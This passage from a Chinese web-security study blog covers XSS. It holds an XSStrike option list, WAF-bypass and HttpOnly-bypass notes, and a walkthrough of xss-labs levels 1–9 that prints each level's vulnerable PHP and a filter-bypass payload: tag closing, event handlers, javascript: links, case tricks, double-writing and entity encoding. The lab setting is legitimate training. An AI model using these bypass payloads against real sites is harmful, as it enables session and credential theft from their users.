支持高效的工作流完整的 HTTP 支持Bruteforce payloads 支持Payload 编码</code></pre><pre class=" language-bash"><code class="language-bash">-h, --help //显示帮助信息-u, --url //指定目标 URL--data //POST 方式提交内容-v, --verbose //详细输出-f, --file //加载自定义 paload 字典-t, --threads //定义线程数-l, --level //爬行深度-t, --encode //定义 payload 编码方式--json //将 POST 数据视为 JSON--path //测试 URL 路径组件--seeds //从文件中测试、抓取 URL--fuzzer //测试过滤器和 Web 应用程序防火墙。--update //更新--timeout //设置超时时间--params //指定参数--crawl //爬行--proxy //使用代理--blind //盲测试--skip //跳过确认提示--skip-dom //跳过 DOM 扫描--headers //提供 HTTP 标头-d, --delay //设置延迟</code></pre><p><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/6.png"></p><h4 id="简单的探针绕过"><a href="#简单的探针绕过" class="headerlink" title="简单的探针绕过"></a><font size="4"><strong>简单的探针绕过</strong></font></h4><p><img src="/2023/10/11/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-028/7.png"></p><h4 id="object标签-1"><a href="#object标签-1" class="headerlink" title="object标签"></a><font size="4"><strong>object标签</strong></font></h4><pre class=" language-bash"><code class="language-bash">开启 httponly,输入过滤，输出过滤等PHP:http://www.zuimoge.com/212.htmlJAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html</code></pre><h3 id="五、演示案例"><a href="#五、演示案例" class="headerlink" title="五、演示案例"></a><font size="5"><strong>五、演示案例</strong></font></h3><p>● 手工探针 XSS 绕过 WAF 规则<br>● 自动化 XSS 绕过 WAF 测试演示<br>● Fuzz 下 XSS 绕过 WAF 测试演示<br>● 关于 XSS 跨站安全修复建议测试  </p><h3 id="六、涉及资源"><a href="#六、涉及资源" class="headerlink" title="六、涉及资源"></a><font size="5"><strong>六、涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://gitee.com/yhtmxl/imxss/https://github.com/3xp10it/xwafhttps://xssfuzzer.com/fuzzer.htmlhttps://github.com/s0md3v/XSStrikehttps://bbs.pediy.com/thread-250852.htmhttps://github.com/TheKingOfDuck/fuzzDicts</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-027</title>
      <link href="/2023/10/10/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-027/"/>
      <url>/2023/10/10/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-027/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-XSS跨站之代码及httponly绕过"><a href="#WEB漏洞-XSS跨站之代码及httponly绕过" class="headerlink" title="WEB漏洞-XSS跨站之代码及httponly绕过"></a><font size="6"><strong>WEB漏洞-XSS跨站之代码及httponly绕过</strong></font></h2><span id="more"></span><p><img src="/2023/10/10/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-027/1.png"></p><p>代码类过滤：Xss-labs<br>HttpOnly属性过滤防读取</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 设置http-only</span><span class="token operator">&lt;</span>?php      ini_set<span class="token punctuation">(</span><span class="token string">"session.cookie_httponly"</span>, 1<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><h3 id="一、绕过httponly："><a href="#一、绕过httponly：" class="headerlink" title="一、绕过httponly："></a><font size="5"><strong>一、绕过httponly：</strong></font></h3><p>浏览器未保存帐号密码：需要xss漏洞点在登录页面，利用表单劫持<br>浏览器保存帐号密码：产生在后台的xss，存储型xss如留言等，浏览器读取帐号密码</p><h3 id="二、演示案例："><a href="#二、演示案例：" class="headerlink" title="二、演示案例："></a><font size="5"><strong>二、演示案例：</strong></font></h3><p>➢ HttpOnly安全过滤测试<br>➢ HttpOnly安全过滤绕过思路<br>➢ Xss-labs关卡代码过滤绕过测试</p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br>超级加解密转换工具 <a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a><br>什么是HttpOnly <a href="https://www.oschina.net/question/100267_65116">https://www.oschina.net/question/100267_65116</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-026</title>
      <link href="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/"/>
      <url>/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-XSS跨站之订单及Shell箱子反杀记"><a href="#WEB漏洞-XSS跨站之订单及Shell箱子反杀记" class="headerlink" title="WEB漏洞-XSS跨站之订单及Shell箱子反杀记"></a><font size="6"><strong>WEB漏洞-XSS跨站之订单及Shell箱子反杀记</strong></font></h2><span id="more"></span><h3 id="一、涉及资源"><a href="#一、涉及资源" class="headerlink" title="一、涉及资源"></a><font size="5"><strong>一、涉及资源</strong></font></h3><p><a href="https://xss8.cc/">https://xss8.cc/</a><br><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p><p><a href="http://xss.fbisb.com/">http://xss.fbisb.com/</a><br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br><a href="https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA">https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA</a> 提取码：xiao<br><a href="https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw">https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw</a> 提取码：xiao</p><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/1.png"></p><h3 id="二、xss-labs靶场搭建"><a href="#二、xss-labs靶场搭建" class="headerlink" title="二、xss-labs靶场搭建"></a><font size="5"><strong>二、xss-labs靶场搭建</strong></font></h3><p>通关手册：<a href="https://blog.csdn.net/wo41ge/article/details/107459332">https://blog.csdn.net/wo41ge/article/details/107459332</a><br><a href="https://blog.csdn.net/weixin_43669045/article/details/107932942">https://blog.csdn.net/weixin_43669045/article/details/107932942</a></p><p>靶场项目地址：<a href="https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master">https://codeload.github.com/do0dl3/xss-labs/zip/refs/heads/master</a></p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a><font size="4"><strong>level1</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--STATUS OK--<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window.location.href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level1<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level1<span class="token operator">&lt;</span>/h1<span class="token operator">></span><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>欢迎用户"</span><span class="token keyword">.</span><span class="token variable">$str</span><span class="token keyword">.</span><span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level1.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/2.png"></p><p>在上面的代码中可以看到传入参数name<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/3.png"></p><p>将传入的参数替换为js代码执行<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/4.png"></p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a><font size="4"><strong>level2</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--STATUS OK--<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window.location.href<span class="token operator">=</span><span class="token string">"level3.php?writing=wait"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level2<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level2<span class="token operator">&lt;</span>/h1<span class="token operator">></span><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form action=level2.php method=GET>&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str</span><span class="token keyword">.</span><span class="token string">'">&lt;input type=submit name=submit value="搜索"/>&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level2.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>因为内容被嵌套在表单中的value属性内<input type=submit name=submit value="搜索"/> 所以需要先闭合input标签，”&gt;把前面的input标签闭合，然后在注入代码，闭合标签。最终构成以下代码</p><pre class=" language-bash"><code class="language-bash">123"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/5.png"></p><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a><font size="4"><strong>level3</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">"&lt;center>&lt;form action=level3.php method=GET>&lt;input name=keyword  value='"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"'>&lt;input type=submit name=submit value=搜索 />&lt;/form>&lt;/center>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level3.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>后端利用htmlspecialchars()函数会将特殊字符进行转义，这里无法采用标签，因为标签都是带有”&lt;”的。但该函数不会转义单引号，可以采用事件闭合标签.</p><pre class=" language-bash"><code class="language-bash">playload： <span class="token string">' onclick='</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/6.png"></p><h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a><font size="4"><strong>level4</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form action=level4.php method=GET>&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str3</span><span class="token keyword">.</span><span class="token string">'">&lt;input type=submit name=submit value=搜索 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level4.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p>可以看到的是&lt;&gt;都被替换为空，也就没法采用标签闭合的方式 C<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/7.png"></p><h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a><font size="4"><strong>level5</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;script"</span>,<span class="token string">"&lt;scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form action=level5.php method=GET>&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str3</span><span class="token keyword">.</span><span class="token string">'">&lt;input type=submit name=submit value=搜索 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p>限制了script和on字符—-&gt;替换成scr_pt 和o_n ，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接</p><pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> <span class="token operator">></span> xss<span class="token operator">&lt;</span>/a<span class="token operator">></span> //</code></pre><h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a><font size="4"><strong>level6</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;script"</span>,<span class="token string">"&lt;scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form action=level6.php method=GET>&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str6</span><span class="token keyword">.</span><span class="token string">'">&lt;input type=submit name=submit value=搜索 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level6.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p>限制了一系列的字符 但进行判断的是整个字符串，但是没有进行大小写绕过。</p><pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/SCRIPT<span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/8.png"></p><h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a><font size="4"><strong>level7</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span>strtolower<span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">""</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">""</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">""</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">""</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">""</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>&lt;form action=level7.php method=GET>&lt;input name=keyword  value="'</span><span class="token keyword">.</span><span class="token variable">$str6</span><span class="token keyword">.</span><span class="token string">'">&lt;input type=submit name=submit value=搜索 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level7.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>?php</code></pre><p>限制了一系列的字符 大小写无法绕过，但因为只是替换，可以双写绕过。</p><pre class=" language-bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>scscriptript<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/scrscriptipt<span class="token operator">></span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/9.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/10.png"></p><h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a><font size="4"><strong>level8</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">'"'</span>,<span class="token string">'&amp;quot'</span>,<span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;form action=level8.php method=GET>&lt;input name=keyword  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">&lt;input type=submit name=submit value=添加友情链接 />&lt;/form>&lt;/center>'</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><a href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/11.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span></code></pre><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/12.png"></p><h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a><font size="4"><strong>level9</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"scr_ipt"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"on"</span>,<span class="token string">"o_n"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"src"</span>,<span class="token string">"sr_c"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"data"</span>,<span class="token string">"da_ta"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"href"</span>,<span class="token string">"hr_ef"</span>,<span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token 